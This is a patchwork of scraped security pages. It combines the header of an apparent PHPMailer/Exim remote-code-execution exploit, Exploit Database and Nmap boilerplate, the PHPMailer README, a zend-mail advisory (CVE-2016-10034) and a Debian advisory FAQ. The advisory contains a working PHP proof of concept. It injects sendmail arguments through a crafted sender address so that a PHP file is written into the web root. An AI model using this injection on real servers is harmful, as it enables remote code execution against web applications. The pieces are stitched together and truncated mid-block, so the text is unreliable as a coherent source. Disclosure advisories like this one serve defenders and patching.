# http://pwnscriptum.com/
#
# --------------------------------------------------------
# Enhanced for Exim MTA
#
# N.B:
# The original author's method in the PHPMailer POC (for sendmail MTA) uses the RFC 3696
# double quotes technique associated with the -oQ -X options to log mailer traffic and to create
# the backdoor. This technique is not facing some payload size issues because the payload
# was in the email body.
#
# For Exim:
# The original author's Wordpress 4.6 POC for Exim combines the comment syntax (RFC 822)
# and the Exim expansion mode techniques. The use of substr on spool_directory and tod_log
# expansion variables in order to bypass the PHP mail() escaping may leads to large
# email addresses payloads. However the comment syntax validateAddress() technique does not
# face any size limitation but its use can not be applied for PHPMailer < 5.2.20.
#
# Goal:
# The use of double quotes validateAdresse() technique (and it's patch bypass for PHPMailer < 5.5.20)
# combined with the Exim expansion mode technique may leads to large payloads quickly facing addresses
# size limit here (260 chars) and so not matching the pcre8 regexp in the validateAddress() function.
# We are now base64 encoding the command in order to bypass escapeshellcmd() and allowing larger payloads.
#
#
# Usage:
# ./rce_phpmailer_exim4.py -url http://victim/phpmailer/ -cf contact_form.php -ip 192.168.1.109 -p 1337
#
#
# Requirements:
# - Vulnerable PHP libraries
# - Exim MTA Agent

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

# Nmap: Discover your network

Nmap ("Network Mapper") is a
[free and open source](/npsl/) utility for
network discovery and security auditing. Many systems and network
administrators also find it useful for tasks such as network
inventory, managing service upgrade schedules, and monitoring host or
service uptime. Nmap uses raw IP packets in novel ways to determine
what hosts are available on the network, what services (application
name and version) those hosts are offering, what operating systems
(and OS versions) they are running, what type of packet
filters/firewalls are in use, and dozens of other characteristics. It
was designed to rapidly scan large networks, but works fine against
single hosts. Nmap runs on all major computer operating systems, and
official binary packages are available for Linux, Windows, and Mac OS
X. In addition to the classic command-line Nmap executable, the Nmap
suite includes an advanced GUI and results viewer
([Zenmap](/zenmap/)), a flexible data
transfer, redirection, and debugging tool
([Ncat](/ncat/)), a utility for
comparing scan results ([Ndiff](/ndiff/)), and a packet generation and response analysis tool ([Nping](/nping/)).

Nmap was named “Security Product of the Year” by Linux
Journal, Info World, LinuxQuestions.Org, and Codetalker Digest. It
was even featured in [twelve
movies](/movies/), including
[The Matrix Reloaded](/movies/#matrix),
[Die Hard 4](/movies/#diehard4),
[Girl With the Dragon Tattoo](/movies/#gwtdt),
and
[The Bourne Ultimatum](/movies/#bourne).

Nmap is ...

* Nmap
  Security
  Port Scanner
* **Flexible**: Supports dozens of advanced techniques for
  mapping out networks filled with IP filters, firewalls, routers, and
  other obstacles. This includes many [port scanning](/book/man-port-scanning-techniques.html) mechanisms (both TCP &
  UDP), [OS
  detection](/book/osdetect.html), [version detection](/book/vscan.html), ping sweeps, and more. See the [documentation page](/docs.html).* **Powerful**: Nmap has been used to scan huge networks of
    literally hundreds of thousands of machines.* **Portable**: Most operating systems are supported, including
      Linux,
      Microsoft Windows,
      FreeBSD,
      OpenBSD,
      Solaris,
      IRIX,
      Mac OS X,
      HP-UX,
      NetBSD,
      Sun OS,
      Amiga,
      and more.* **Easy**: While Nmap offers a rich set of advanced features for
        power users, you can start out as simply as "nmap -v -A *targethost*". Both traditional command line and graphical (GUI)
        versions are available to suit your preference. Binaries are
        available for those who do not wish to compile Nmap from source.* **Free**: The primary goals of the Nmap Project is to help make
          the Internet a little more secure and to provide
          administrators/auditors/hackers with an advanced tool for exploring
          their networks. Nmap is available for [free download](https://nmap.org/download.html), and also comes with full
          source code that you may modify and redistribute under the terms of
          the [license](data/COPYING).* **Well Documented**: Significant effort has been put into
            comprehensive and up-to-date man pages, whitepapers, tutorials, and
            even a whole book! Find them in multiple
            languages [here](/docs.html).* **Supported**: While Nmap comes with no warranty, it is well supported by a vibrant community of developers and users. Most of this interaction occurs on the [Nmap mailing lists](#lists). Most bug reports and questions should be sent to the [nmap-dev list](https://seclists.org/nmap-dev), but only after you read the [guidelines](/book/man-bugs.html). We recommend that all users subscribe to the low-traffic [nmap-hackers](https://seclists.org/nmap-hackers) announcement list. You can also find Nmap on [Facebook](http://facebook.com/nmap) and [Twitter](http://twitter.com/nmap). For real-time chat, join the #nmap channel on [Freenode](http://freenode.net/) or [EFNet](http://www.efnet.org/).* **Acclaimed**: Nmap has won numerous awards, including
                "Information Security Product of the Year" by Linux Journal, Info
                World and Codetalker Digest. It has been featured in hundreds of
                magazine articles, several movies, dozens of books, and one comic book
                series. Visit the [press page](nmap_inthenews.html)
                for further details.* **Popular**: Thousands of people download Nmap every day, and
                  it is included with many operating systems (Redhat Linux, Debian
                  Linux, Gentoo, FreeBSD, OpenBSD, etc). It is among the top ten (out of
                  30,000) programs at the Freshmeat.Net repository. This is important
                  because it lends Nmap its vibrant development and user support
                  communities.

## Communication

Nmap users are encouraged to subscribe to the *Nmap-hackers*
mailing list. It is a low volume (6 posts in 2017), moderated list
for the most important announcements about Nmap, Insecure.org, and
related projects. You can join more than 128,000 current subscribers
by submitting your email address here:

(or subscribe with custom options from the [Nmap-hackers list info page](https://nmap.org/mailman/listinfo/announce))

We also have a development list for more hardcore members
(especially programmers) who are interested in helping the project by
helping with coding, testing, feature ideas, etc. New (test/beta)
versions of Nmap are sometimes released here prior to general
availability for QA purposes. You can subscribe at the [Nmap-dev list
info page](https://nmap.org/mailman/listinfo/dev).

Both lists are archived (along with many other security lists) at [Seclists.org](https://seclists.org).

Though it isn't nearly as active as the mailing lists, the official IRC channel is #nmap on [Freenode](http://freenode.net/) (irc.freenode.net).

## Why you might need it

Many PHP developers need to send email from their code. The only PHP function that supports this directly is [`mail()`](https://www.php.net/manual/en/function.mail.php). However, it does not provide any assistance for making use of popular features such as encryption, authentication, HTML messages, and attachments.

Formatting email correctly is surprisingly difficult. There are myriad overlapping (and conflicting) standards, requiring tight adherence to horribly complicated formatting and encoding rules – the vast majority of code that you'll find online that uses the `mail()` function directly is just plain wrong, if not unsafe!

The PHP `mail()` function usually sends via a local mail server, typically fronted by a `sendmail` binary on Linux, BSD, and macOS platforms, however, Windows usually doesn't include a local mail server; PHPMailer's integrated SMTP client allows email sending on all platforms without needing a local mail server. Be aware though, that the `mail()` function should be avoided when possible; it's both faster and [safer](https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html) to use SMTP to localhost.

*Please* don't be tempted to do it yourself – if you don't use PHPMailer, there are many other excellent libraries that
you should look at before rolling your own. Try [SwiftMailer](https://swiftmailer.symfony.com/)
, [Laminas/Mail](https://docs.laminas.dev/laminas-mail/), [ZetaComponents](https://github.com/zetacomponents/Mail), etc.

Please read [LICENSE](https://github.com/PHPMailer/PHPMailer/blob/master/LICENSE) for information on the software availability and distribution.

## Installation & loading

PHPMailer is available on [Packagist](https://packagist.org/packages/phpmailer/phpmailer) (using semantic versioning), and installation via [Composer](https://getcomposer.org) is the recommended way to install PHPMailer. Just add this line to your `composer.json` file:

```
"phpmailer/phpmailer": "^6.9.2"
```

or run

```
composer require phpmailer/phpmailer
```

Note that the `vendor` folder and the `vendor/autoload.php` script are generated by Composer; they are not part of PHPMailer.

If you want to use XOAUTH2 authentication, you will also need to add a dependency on the `league/oauth2-client` and appropriate service adapters package in your `composer.json`, or take a look at
by @decomplexity's [SendOauth2 wrapper](https://github.com/decomplexity/SendOauth2), especially if you're using Microsoft services.

Alternatively, if you're not using Composer, you
can [download PHPMailer as a zip file](https://github.com/PHPMailer/PHPMailer/archive/master.zip), (note that docs and examples are not included in the zip file), then copy the contents of the PHPMailer folder into one of the `include_path` directories specified in your PHP configuration and load each class file manually:

```
<?php
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

require 'path/to/PHPMailer/src/Exception.php';
require 'path/to/PHPMailer/src/PHPMailer.php';
require 'path/to/PHPMailer/src/SMTP.php';
```

If you're not using the `SMTP` class explicitly (you're probably not), you don't need a `use` line for the SMTP class. Even if you're not using exceptions, you do still need to load the `Exception` class as it is used internally.

## Legacy versions

PHPMailer 5.2 (which is compatible with PHP 5.0 — 7.0) is no longer supported, even for security updates. You will find the latest version of 5.2 in the [5.2-stable branch](https://github.com/PHPMailer/PHPMailer/tree/5.2-stable). If you're using PHP 5.5 or later (which you should be), switch to the 6.x releases.

### Upgrading from 5.2

The biggest changes are that source files are now in the `src/` folder, and PHPMailer now declares the namespace `PHPMailer\PHPMailer`. This has several important effects – [read the upgrade guide](https://github.com/PHPMailer/PHPMailer/tree/master/UPGRADING.md) for more details.

### Minimal installation

While installing the entire package manually or with Composer is simple, convenient, and reliable, you may want to include only vital files in your project. At the very least you will need [src/PHPMailer.php](https://github.com/PHPMailer/PHPMailer/tree/master/src/PHPMailer.php). If you're using SMTP, you'll need [src/SMTP.php](https://github.com/PHPMailer/PHPMailer/tree/master/src/SMTP.php), and if you're using POP-before SMTP (*very* unlikely!), you'll need [src/POP3.php](https://github.com/PHPMailer/PHPMailer/tree/master/src/POP3.php). You can skip the [language](https://github.com/PHPMailer/PHPMailer/tree/master/language/) folder if you're not showing errors to users and can make do with English-only errors. If you're using XOAUTH2 you will need [src/OAuth.php](https://github.com/PHPMailer/PHPMailer/tree/master/src/OAuth.php) as well as the Composer dependencies for the services you wish to authenticate with. Really, it's much easier to use Composer!

## A Simple Example

```
<?php
//Import PHPMailer classes into the global namespace
//These must be at the top of your script, not inside a function
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

//Load Composer's autoloader
require 'vendor/autoload.php';

//Create an instance; passing `true` enables exceptions
$mail = new PHPMailer(true);

try {
    //Server settings
    $mail->SMTPDebug = SMTP::DEBUG_SERVER;                      //Enable verbose debug output
    $mail->isSMTP();                                            //Send using SMTP
    $mail->Host       = 'smtp.example.com';                     //Set the SMTP server to send through
    $mail->SMTPAuth   = true;                                   //Enable SMTP authentication
    $mail->Username   = 'user@example.com';                     //SMTP username
    $mail->Password   = 'secret';                               //SMTP password
    $mail->SMTPSecure = PHPMailer::ENCRYPTION_SMTPS;            //Enable implicit TLS encryption
    $mail->Port       = 465;                                    //TCP port to connect to; use 587 if you have set `SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS`

    //Recipients
    $mail->setFrom('from@example.com', 'Mailer');
    $mail->addAddress('joe@example.net', 'Joe User');     //Add a recipient
    $mail->addAddress('ellen@example.com');               //Name is optional
    $mail->addReplyTo('info@example.com', 'Information');
    $mail->addCC('cc@example.com');
    $mail->addBCC('bcc@example.com');

    //Attachments
    $mail->addAttachment('/var/tmp/file.tar.gz');         //Add attachments
    $mail->addAttachment('/tmp/image.jpg', 'new.jpg');    //Optional name

    //Content
    $mail->isHTML(true);                                  //Set email format to HTML
    $mail->Subject = 'Here is the subject';
    $mail->Body    = 'This is the HTML message body <b>in bold!</b>';
    $mail->AltBody = 'This is the body in plain text for non-HTML mail clients';

    $mail->send();
    echo 'Message has been sent';
} catch (Exception $e) {
    echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
}
```

You'll find plenty to play with in the [examples](https://github.com/PHPMailer/PHPMailer/tree/master/examples) folder, which covers many common scenarios including sending through Gmail, building contact forms, sending to mailing lists, and more.

If you are re-using the instance (e.g. when sending to a mailing list), you may need to clear the recipient list to avoid sending duplicate messages. See [the mailing list example](https://github.com/PHPMailer/PHPMailer/blob/master/examples/mailing_list.phps) for further guidance.

That's it. You should now be ready to use PHPMailer!

## Localization

PHPMailer defaults to English, but in the [language](https://github.com/PHPMailer/PHPMailer/tree/master/language/) folder, you'll find many translations for PHPMailer error messages that you may encounter. Their filenames contain [ISO 639-1](https://en.wikipedia.org/wiki/ISO_639-1) language code for the translations, for example `fr` for French. To specify a language, you need to tell PHPMailer which one to use, like this:

```
//To load the French version
$mail->setLanguage('fr', '/optional/path/to/language/directory/');
```

We welcome corrections and new languages – if you're looking for corrections, run the [Language/TranslationCompletenessTest.php](https://github.com/PHPMailer/PHPMailer/blob/master/test/Language/TranslationCompletenessTest.php) script in the tests folder and it will show any missing translations.

## Documentation

Start reading at the [GitHub wiki](https://github.com/PHPMailer/PHPMailer/wiki). If you're having trouble, head for [the troubleshooting guide](https://github.com/PHPMailer/PHPMailer/wiki/Troubleshooting) as it's frequently updated.

Examples of how to use PHPMailer for common scenarios can be found in the [examples](https://github.com/PHPMailer/PHPMailer/tree/master/examples) folder. If you're looking for a good starting point, we recommend you start with [the Gmail example](https://github.com/PHPMailer/PHPMailer/tree/master/examples/gmail.phps).

To reduce PHPMailer's deployed code footprint, examples are not included if you load PHPMailer via Composer or via [GitHub's zip file download](https://github.com/PHPMailer/PHPMailer/archive/master.zip), so you'll need to either clone the git repository or use the above links to get to the examples directly.

Complete generated API documentation is [available online](https://phpmailer.github.io/PHPMailer/).

You can generate complete API-level documentation by running `phpdoc` in the top-level folder, and documentation will appear in the `docs` folder, though you'll need to have [PHPDocumentor](https://www.phpdoc.org) installed. You may find [the unit tests](https://github.com/PHPMailer/PHPMailer/blob/master/test/PHPMailer/PHPMailerTest.php) a good reference for how to do various operations such as encryption.

If the documentation doesn't cover what you need, search the [many questions on Stack Overflow](https://stackoverflow.com/questions/tagged/phpmailer), and before you ask a question about "SMTP Error: Could not connect to SMTP host.", [read the troubleshooting guide](https://github.com/PHPMailer/PHPMailer/wiki/Troubleshooting).

## Tests

[PHPMailer tests](https://github.com/PHPMailer/PHPMailer/tree/master/test/) use PHPUnit 9, with [a polyfill](https://github.com/Yoast/PHPUnit-Polyfills) to let 9-style tests run on older PHPUnit and PHP versions.

#
# --------------------------------------------------------
# Enhanced for Exim MTA
#
# N.B:
# The original author's method in the PHPMailer POC (for sendmail MTA) uses the RFC 3696
# double quotes technique associated with the -oQ -X options to log mailer traffic and to create
# the backdoor. This technique is not facing some payload size issues because the payload
# was in the email body.
#
# For Exim:
# The original author's Wordpress 4.6 POC for Exim combines the comment syntax (RFC 822)
# and the Exim expansion mode techniques. The use of substr on spool\_directory and tod\_log
# expansion variables in order to bypass the PHP mail() escaping may leads to large
# email addresses payloads. However the comment syntax validateAddress() technique does not
# face any size limitation but its use can not be applied for PHPMailer < 5.2.20.
#
# Goal:
# The use of double quotes validateAdresse() technique (and it's patch bypass for PHPMailer < 5.5.20)
# combined with the Exim expansion mode technique may leads to large payloads quickly facing addresses
# size limit here (260 chars) and so not matching the pcre8 regexp in the validateAddress() function.
# We are now base64 encoding the command in order to bypass escapeshellcmd() and allowing larger payloads.
#

============================================
- Discovered by: Dawid Golunski
- dawid[at]legalhackers.com
- <https://legalhackers.com>

- CVE-2016-10034
- Release date:  30.12.2016
- Last revision: 30.12.2016
- Revision 1.0
- Severity: Critical
=============================================

I. VULNERABILITY
-------------------------

Zend Framework < 2.4.11    Remote Code Execution (CVE-2016-10034)
zend-mail < 2.4.11
zend-mail < 2.7.2

II. BACKGROUND
-------------------------

"Zend Framework is a collection of professional PHP packages with more than 95
million installations. It can be used to develop web applications and
services using PHP 5.6+, and provides 100% object-oriented code using a broad
spectrum of language features.

Zend Framework 3 evolved from both Zend Framework 2 and 1; cumulatively,
the previous versions were downloaded more than 15 million times.

The principal sponsor of Zend Framework is Zend, a Rogue Wave Company, but
many others have contributed components or significant features to the
framework. Companies such as Google, Microsoft, and StrikeIron have
partnered with Zend to provide interfaces to web services and other
technologies they wish to make available to ZF developers."

<https://framework.zend.com/about>

<https://github.com/zendframework/zendframework>

III. INTRODUCTION
-------------------------

An independent research uncovered a critical vulnerability in zend-mail, a
Zend Framework's component that could potentially be used by (unauthenticated)
remote attackers to achieve remote arbitrary code execution in the context
of the web server user and remotely compromise the target web application.

To exploit the vulnerability an attacker could target common website
components such as contact/feedback forms, registration forms, password
email resets and others that send out emails with the help of a vulnerable
version of the zend-mail class.

Note: This advisory is limited.
Remaining attack vectors/exploits will be disclosed at a later date to allow
more time for patching.

IV. DESCRIPTION
-------------------------

zend-mail component of Zend Framework, suffers from the same vulnerability as
the ones disclosed in PHPMailer and SwiftMailer:

<https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10033-Vuln.html>

<https://legalhackers.com/advisories/SwiftMailer-Exploit-Remote-Code-Exec-CVE-2016-10074-Vuln.html>

If a web application based on Zend Framework passes an untrusted input to
setFrom() function of the zend-mail's Sendmail transport, an attacker could
inject additional parameters to Sendmail program.

By injecting an extra sequence of \" after the first argument, the following email:

"Attacker \" -Param2 -Param3"@test.com

when passed to zend-mail's Sendmail transport (and eventually to mail()) function
would cause sendmail to execute with:

Arg no. 0 == [/usr/sbin/sendmail]
Arg no. 1 == [-t]
Arg no. 2 == [-i]
Arg no. 3 == [-fAttacker\]
Arg no. 4 == [-Param2]
Arg no. 5 == [-Param3"@test.com]

Which as can be seen would inject additional parameters of 4 & 5 to sendmail.

Attackers can exploit this to achieve code execution as shown in the PoC
below.

V. PROOF OF CONCEPT EXPLOIT
-------------------------

<?php

/*

Zend Framework < 2.4.11    Remote Code Execution (CVE-2016-10034)
zend-mail < 2.4.11
zend-mail < 2.7.2

A simple PoC (working on Sendmail MTA)

It will inject the following parameters to sendmail command:

Arg no. 0 == [/usr/sbin/sendmail]
Arg no. 1 == [-t]
Arg no. 2 == [-i]
Arg no. 3 == [-r]
Arg no. 4 == [attacker\]
Arg no. 5 == [-oQ/tmp/]
Arg no. 6 == [-X/var/www/cache/phpcode.php]
Arg no. 7 == ["@email.com]

which will write the transfer log (-X) into /var/www/cache/phpcode.php file.
Note /var/www/cache must be writable by www-data web user.

The resulting file will contain the payload passed in the body of the msg:

09607 <<< Content-Type: text/html; charset=us-ascii
09607 <<<
09607 <<< <?php phpinfo(); ?>
09607 <<<
09607 <<<
09607 <<<

See the full advisory URL for the exploit details.

// Attacker's input coming from untrusted source such as $_GET , $_POST etc.
// For example from a Contact form with sender/body fields

$email_from = '"attacker\" -oQ/tmp/ -X/var/www/cache/phpcode.php "@email.com';
// encoded phpinfo() php code
$msg_body = base64_decode("PD9waHAgcGhwaW5mbygpOyA/Pg==");

// ------------------

// mail() param injection via the vulnerability in zend-mail

chdir(dirname(__DIR__));
include 'vendor/Zend/Loader/AutoloaderFactory.php';

Zend\Loader\AutoloaderFactory::factory(array(
        'Zend\Loader\StandardAutoloader' => array(
                'autoregister_zf' => true
        )
));

Zend\Mvc\Application::init(require 'config/application.php')->run();

$message        = new \Zend\Mail\Message();

$message->setBody($msg_body);
$message->setFrom($email_from, 'Attacker');
$message->addTo('support@localhost', 'Support');
$message->setSubject('Zend PoC');

$transport  = new \Zend\Mail\Transport\Sendmail();
$transport->send($message);

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

Nmap (“Network Mapper”) is an open source tool for network
exploration and security auditing. It was designed to rapidly
scan large networks, although it works fine against single
hosts. Nmap uses raw IP packets in novel ways to determine what
hosts are available on the network, what services (application
name and version) those hosts are offering, what operating systems
(and OS versions) they are running, what type of packet
filters/firewalls are in use, and dozens of other
characteristics. While Nmap is commonly used for security audits,
many systems and network administrators find it useful for routine
tasks such as network inventory, managing service upgrade
schedules, and monitoring host or service uptime.

The output from Nmap is a list of scanned targets, with
supplemental information on each depending on the options
used. Key among that information is the “interesting ports
table”.
That table lists the port number and protocol,
service name, and state. The state is either
`open`, `filtered`,
`closed`, or `unfiltered`.
`Open`
means that an application on the target machine is listening for
connections/packets on that port.
`Filtered`
means that a firewall, filter, or other network
obstacle is blocking the port so that Nmap cannot tell whether it is
`open` or `closed`.
`Closed`
ports have no application listening on them,
though they could open up at any time.
Ports are classified as
`unfiltered`
when they are
responsive to Nmap's probes, but Nmap cannot determine whether they are
open or closed.
Nmap reports the state combinations
`open|filtered`
and `closed|filtered`
when it cannot determine which
of the two states describe a port. The port table may also
include software version details when version detection has been
requested. When an IP protocol scan is requested
(`-sO`), Nmap provides information on supported IP
protocols rather than listening ports.

In addition to the interesting ports table, Nmap can provide
further information on targets, including reverse DNS names,
operating system guesses, device types, and MAC addresses.

A typical Nmap scan is shown in [Example 15.1](man.html#man-ex-repscan "Example 15.1. A representative Nmap scan"). The only Nmap arguments used in
this example are `-A`, to enable OS and version
detection, script scanning, and traceroute; `-T4` for
faster execution; and then the hostname.

Example 15.1. A representative Nmap scan
```
# nmap -A -T4 scanme.nmap.org

Package        : libphp-swiftmailer
CVE ID         : CVE-2016-10074
Debian Bug     : 849626

Dawid Golunski from LegalHackers discovered that PHP Swift Mailer, a
mailing solution for PHP, did not correctly validate user input. This
allowed a remote attacker to execute arbitrary code by passing
specially formatted email addresses in specific email headers.

For the stable distribution (jessie), this problem has been fixed in
version 5.2.2-1+deb8u1.

For the testing (stretch) and unstable (sid) distributions, this
problem has been fixed in version 5.4.2-1.1.

We recommend that you upgrade your libphp-swiftmailer packages.

When are those going to be fixed?](#cve-severity-assessment)- [What does local (remote) mean?](#localremote)

*Q: I received a DSA via debian-security-announce, how can I upgrade the vulnerable packages?*

A: As the DSA mail says, you should upgrade the packages affected by the
announced vulnerability. You can do this by just upgrading (after
updating the list of available packages with apt-get update)
every package in your system with apt-get upgrade or by
upgrading just a particular package, with apt-get install
*package*.

The announcement mail mentions the source package in which the vulnerability
was present. Therefore, you should update all the binary packages from
that source package. To check the binary packages to update, visit
https://packages.debian.org/src:*source-package-name* and
click on *[show ... binary packages]* for the distribution you
are updating.

It may also be necessary to restart a service or a running process. The
command [checkrestart](https://manpages.debian.org/checkrestart)
included in the package
[debian-goodies](https://packages.debian.org/debian-goodies)
might help to find which ones.

*Q: The signature on your advisories does not verify correctly!*

A: This is most likely a problem on your end. The
[debian-security-announce](https://lists.debian.org/debian-security-announce/)
list has a filter that only allows messages with a correct signature
from one of the security team members to be posted.

Most likely some piece of mail software on your end slightly changes
the message that breaks the signature. Make sure your software does
not do any MIME encoding or decoding, or tab/space conversions.

Known culprits are fetchmail (with the mimedecode option enabled),
formail (from procmail 3.14 only) and evolution.

*Q: How is security handled in Debian?*

A: Once the security team receives a notification of an incident,
one or more members review it and consider its impact on the stable
release of Debian (i.e. if it's vulnerable or not).
If our system is vulnerable, we work on a fix for the
problem. The package maintainer is contacted as well, if they didn't
contact the security team already. Finally, the fix is tested and
new packages are prepared, which are then compiled on all stable
architectures and uploaded afterwards. After all of that is done,
an advisory is published.

*Q: Why are you fiddling with an old version of that package?*

The most important guideline when making a new package that fixes a
security problem is to make as few changes as possible. Our users and
developers are relying on the exact behaviour of a release once it is made,
so any change we make can possibly break someone's system. This is
especially true in case of libraries: make sure you never change the
Application Program Interface (API) or Application Binary Interface (ABI),
no matter how small the change is.

This means that moving to a new upstream version is not a good solution,
instead the relevant changes should be backported. Generally upstream
maintainers are willing to help if needed, if not the Debian security team
might be able to help.

In some cases it is not possible to backport a security fix, for example
when large amounts of source code need to be modified or rewritten. If that
happens it might be necessary to move to a new upstream version, but this
has to be coordinated with the security team beforehand.

*Q: The version number for a package indicates that I am still running
a vulnerable version!*

A: Instead of upgrading to a new release we backport security fixes to
the version that was shipped in the stable release. The reason we do
this is to make sure that a release changes as little as possible
so things will not change or break unexpectedly as a result of a
security fix. You can check if you are running a secure version of
a package by looking at the package changelog, or comparing its
exact version number with the version indicated in the Debian
Security Advisory.

*Q: I received an advisory, but the build for one
processor architecture seems to be missing.*

A: Generally the Security Team releases an advisory with builds of the updated
packages for all architectures that Debian supports. However, some architectures
are slower than others and it may happen that builds for most architectures
are ready while some are still missing. These smaller archs represent a small
fraction of our user base. Depending on the urgency of the issue
we may decide to release the advisory forthwith. The missing builds will be
installed as soon as they come available, but no further notice of this will
be given. Of course we will never release an advisory where the i386 or amd64
builds are not present.

*Q: How is security handled for unstable?*

A: Security for unstable is primarily handled by package maintainers, not
by the Debian Security Team. Although the security team may upload
high-urgency security-only fixes when maintainers are noticed to be
inactive, support for stable will always have priority.
If you want to have a secure (and stable) server you are strongly encouraged
to stay with stable.

*Q: How is security handled for testing?*

A: Security for testing benefits from the security efforts of the entire
project for unstable. However, there is a minimum two-day migration delay,
and sometimes security fixes can be held up by transitions. The Security
Team helps to move along those transitions holding back important
security uploads, but this is not always possible and delays may occur.
Especially in the months after a new stable release, when many new versions
are uploaded to unstable, security fixes for testing may lag behind.
If you want to have a secure (and stable) server you are strongly
encouraged to stay with stable.

*Q: How is security handled for contrib,
non-free and non-free-firmware?*

A: The short answer is: it's not. Contrib, non-free and non-free-firmware aren't official
parts of the Debian Distribution and are not released, and thus not
supported by the security team. Some non-free packages are distributed
without source or without a license allowing the distribution of modified
versions. In those cases no security fixes can be made at all. If it
is possible to fix the problem, and the package maintainer or someone else
provides correct updated packages, then the security team will generally
process them and release an advisory.

*Q: The advisory says unstable is fixed in
version 1.2.3-1, but unstable has 1.2.5-1, what's up?*

A: We try to list the first version in unstable that fixed the problem.
Sometimes the maintainer has uploaded even newer versions in the meantime.
Compare the version in unstable with the version we indicate. If it's the
same or higher, you should be safe from this vulnerability. If you want to
be sure, you can check the package changelog with apt-get changelog
package-name and search for the entry announcing the fix.

*Q: Why are there no official mirrors for security.debian.org?*

A: Actually, there are. There are several official mirrors, implemented
through DNS aliases. The purpose of security.debian.org is to make security
updates available as quickly and easily as possible.

Encouraging the use of unofficial mirrors would add extra complexity
that is usually not needed and that can cause frustration if these
mirrors are not kept up to date.

*Q: I've seen DSA 100 and DSA 102, now where is DSA 101?*

A: Several vendors (mostly of GNU/Linux, but also of BSD
derivatives) coordinate security advisories for some incidents and
agree to a particular timeline so that all vendors are able to
release an advisory at the same time. This was decided in order to
not discriminate some vendors that need more time (e.g. when the
vendor has to pass packages through lengthy QA tests or has to
support several architectures or binary distributions). Our own
security team also prepares advisories in advance. Every now and
then, other security issues have to be dealt with before the parked
advisory could be released, and hence temporarily leaving out one or
more advisories by number.

*Q: How can I reach the security team?*

A: Security information can be sent to security@debian.org or
team@security.debian.org, both of which are read by the members of
the security team.

If desired, email can be encrypted with the Debian Security
